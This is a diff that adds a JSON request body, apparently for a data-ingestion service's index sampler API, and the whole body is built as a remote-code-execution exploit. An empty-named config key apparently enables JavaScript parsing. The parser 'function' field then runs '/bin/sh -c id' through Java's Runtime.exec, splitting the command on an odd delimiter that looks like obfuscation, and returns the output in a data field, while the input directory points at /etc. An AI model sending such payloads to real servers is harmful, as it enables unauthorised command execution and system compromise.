@@ -1,0 +1,30 @@
+{
+  "type": "index",
+  "spec": {
+    "ioConfig": {
+      "type": "index",
+      "firehose": {
+        "type": "local",
+        "baseDir": "/etc",
+        "filter": "*"
+      }
+    },
+    "dataSchema": {
+      "dataSource": "xxxxxx",
+      "parser": {
+        "parseSpec": {
+          "format": "javascript",
+          "timestampSpec": {},
+          "dimensionsSpec": {},
+          "function": "function(){var fileContent = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"/bin/sh`@~-c`@~id\".split(\"`@~\")).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:\"1622212345709\",kadkand: fileContent}}",
+          "": {
+            "enabled": "true"
+          }
+        }
+      }
+    }
+  },
+  "samplerConfig": {
+    "numRows": 10
+  }
+}
